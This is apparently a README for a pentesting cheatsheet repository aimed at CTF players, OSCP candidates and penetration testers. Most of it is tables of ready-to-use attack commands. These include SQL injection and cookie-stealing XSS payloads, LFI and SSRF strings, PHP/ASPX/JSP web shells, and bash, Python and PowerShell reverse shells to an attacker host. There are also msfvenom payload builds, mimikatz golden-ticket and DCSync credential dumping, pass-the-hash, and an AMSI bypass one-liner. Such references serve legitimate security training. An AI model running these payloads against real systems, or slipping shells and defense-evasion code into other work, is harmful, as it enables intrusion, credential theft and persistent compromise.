# Cybersecurity-Cheatsheets

Welcome! This repository contains a curated collection of cheatsheets and personal notes on cybersecurity, pentesting, and ethical hacking.
They are designed to be a quick reference during a CTF, a certification exam (like OSCP/OSCE), or a real-world pentesting engagement.

> load index.dat...

```bash
\$ tree .
.
├── LICENSE
├── README.md
├── 📂 Enumeration
│   ├── Nmap.md
│   ├── Recon-Web.md
│   └── SMB-LDAP.md
├── 📂 Web-Pentesting
│   ├── SQLi.md
│   ├── XSS.md
│   ├── LFI-RFI.md
│   └── SSRF-XXE.md
├── 📂 Priv-Escalation
│   ├── Linux.md
│   └── Windows.md
├── 📂 Active-Directory
│   ├── Kerberos.md
│   ├── Credential-Attacks.md
│   └── Bloodhound.md
├── 📂 Shells
│   ├── Reverse-Shells.md
│   ├── TTY-Upgrade.md
│   └── Web-Shells.md
└── 📂 Red-Teaming
    ├── C2-Frameworks.md
    ├── Payload-Generation.md
    └── Persistence.md
```

#Detailed Content Index

## 📚 Detailed Content Index

### 📍 Enumeration
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
 |---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **Network Scanning**      | `nmap -sC -sV -p- <ip>` (Base scan)<br>`nmap -sU <ip>` (UDP Scan)<br>`nmap -sS -A -T4 <ip>` (Stealthy scan)<br>`masscan -p1-65535 <ip> --rate=1000` (Fast scan)<br>`rustscan -a <ip> -- -sV` (Rust-based) | Use `-sC` for default scripts, `-sV` for version detection, `-O` for OS detection. |
| **Web Enumeration**       | `gobuster dir -u <url> -w <wordlist> -t 50`<br>`feroxbuster -u <url> -w <wordlist> -t 50 -x php,html,js`<br>`nikto -h <url>` (Vulnerability scanner)<br>`whatweb <url>` (Technology identification) | Use `-x` to specify extensions, `-t` for threads.                            |
| **SMB/Windows Enumeration** | `enum4linux -a <ip>` (Full enumeration)<br>`smbclient -L //<ip>` (List shares)<br>`nbtscan <ip-range>` (NetBIOS scan)<br>`crackmapexec smb <ip> --shares -u '' -p ''` (Null session) | Use `smbmap` for more detailed share enumeration.                            |
| **DNS/Subdomain Enumeration** | `dig axfr @<dns-server> <domain>` (Zone transfer)<br>`subfinder -d <domain> -o subdomains.txt`<br>`amass enum -d <domain> -o amass.txt`<br>`dnsrecon -d <domain> -t std` | Use `httpx` to check live subdomains.                                         |

### 🌐 Web Pentesting
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **SQL Injection (SQLi)**  | `sqlmap -u "<url>" --dbs --batch`<br>Manual: `' OR 1=1 -- -`<br>`' OR 1=1 #`<br>Time-based: `' OR IF(1=1,SLEEP(5),0) -- -`<br>Union-based: `' UNION SELECT 1,2,3 -- -` | Use `--risk=3 --level=5` for aggressive testing.                              |
| **Cross-Site Scripting (XSS)** | Reflected: `<script>alert(1)</script>`<br>Stored: `"><img src=x onerror=alert(document.cookie)>`<br>DOM-based: `#<img src=x onerror=alert(1)>`<br>Bypass: `<svg/onload=alert(1)>` | Use `XSS Hunter` for stored XSS testing.                                     |
| **File Inclusion (LFI/RFI)** | LFI: `../../../../etc/passwd`<br>PHP Wrappers: `php://filter/convert.base64-encode/resource=index.php`<br>Log Poisoning: `<?php system($_GET['cmd']); ?>` in Apache logs | Use `LFI2RCE` techniques for remote code execution.                         |
| **Server-Side Request Forgery (SSRF)** | `http://localhost:22`<br>`http://169.254.169.254/` (AWS metadata)<br>`http://[::1]:80/` (IPv6 bypass)<br>`gopher://<attacker-ip>:<port>/` (Gopher protocol) | Use `SSRFmap` for automated testing.                                         |
| **Other Vulnerabilities** | XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">]`<br>Insecure Deserialization: `O:8:"SomeClass":1:{s:4:"data";s:6:"malicious";}`<br>Command Injection: `; id` or `| id` | Use `ysoserial` for Java deserialization exploits.                           |

### 📈 Privilege Escalation
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **Linux**                 | SUID Binaries: `find / -perm -u=s -type f 2>/dev/null`<br>Capabilities: `getcap -r / 2>/dev/null`<br>Cron Jobs: `ls -la /etc/cron.d`<br>Sudo Rules: `sudo -l`<br>Kernel Exploits: `uname -a` | Use `GTFOBins` for SUID exploits.                                             |
| **Windows**               | Services: `sc qc <servicename>`<br>Unquoted Paths: `wmic service get name,pathname`<br>Tokens: `whoami /priv`<br>DLL Hijacking: `procmon` (Process Monitor)<br>Registry: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Use `WinPEAS` for automated enumeration.                                      |

### 💻 Active Directory
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **Initial Enumeration**   | PowerView: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`<br>BloodHound: `SharpHound.exe -c all`<br>LDAP: `ldapsearch -x -H ldap://<ip> -b "dc=<domain>,dc=com"` | Use `ADRecon` for detailed reports.                                           |
| **Kerberos Attacks**      | Kerberoasting: `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request`<br>AS-REP Roasting: `GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <ip> -format hashcat`<br>Golden Ticket: `mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<hash> /ticket:ticket.kirbi` | Use `Rubeus` for Kerberos attacks.                                            |
| **Credential Attacks**    | Pass-the-Hash: `psexec.py <user>@<ip> -hashes <LM:NTLM>`<br>Pass-the-Ticket: `mimikatz # kerberos::ptt ticket.kirbi`<br>DCSync: `mimikatz # lsadump::dcsync /user:<user>` | Use `SecretsDump.py` for credential dumping.                                 |
### 🐚 Shells & TTYs
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **Reverse Shells**        | Bash: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`<br>Python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`<br>PowerShell: `$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` | Use `rlwrap nc -lvnp <port>` for better shell interaction.                     |
| **TTY Upgrade**          | 1. `python -c 'import pty; pty.spawn("/bin/bash")'`<br>2. `Ctrl+Z`<br>3. `stty raw -echo; fg`<br>4. `export TERM=xterm`                                                                                     | Use `script /dev/null -c bash` for more stable TTY.                           |
| **Web Shells**           | PHP: `<?php system($_GET['cmd']); ?>`<br>ASPX: `<%@ Page Language="C#"%><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>`<br>JSP: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` | Use `Weevely` for encrypted web shells.                                      |

### 🔴 Red Teaming
| Subcategory               | Commands/Techniques                                                                                                                                                                                                 | Notes/Examples                                                                 |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|
| **C2 Frameworks**         | Metasploit: `msfconsole`, `use exploit/multi/handler`, `set payload windows/meterpreter/reverse_tcp`<br>Cobalt Strike: `./teamserver <ip> <pass>`, `./aggressor`<br>Empire: `./empire`, `usestager windows/launcher_bat` | Use `Malleable C2` profiles for Cobalt Strike.                                |
| **Payload Generation**   | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe`<br>Stageless: `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 3 > shell.exe`<br>Shellcode: `msfvenom -p windows/exec CMD="calc.exe" -f csharp` | Use `Unicorn` for PowerShell downgrade attacks.                              |
| **Defense Evasion**      | AMSI Bypass: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`<br>Obfuscation: `Invoke-Obfuscation`<br>LOLBAS: `certutil -decode` | Use `Invoke-CradleCrafter` for PowerShell cradle obfuscation.                |

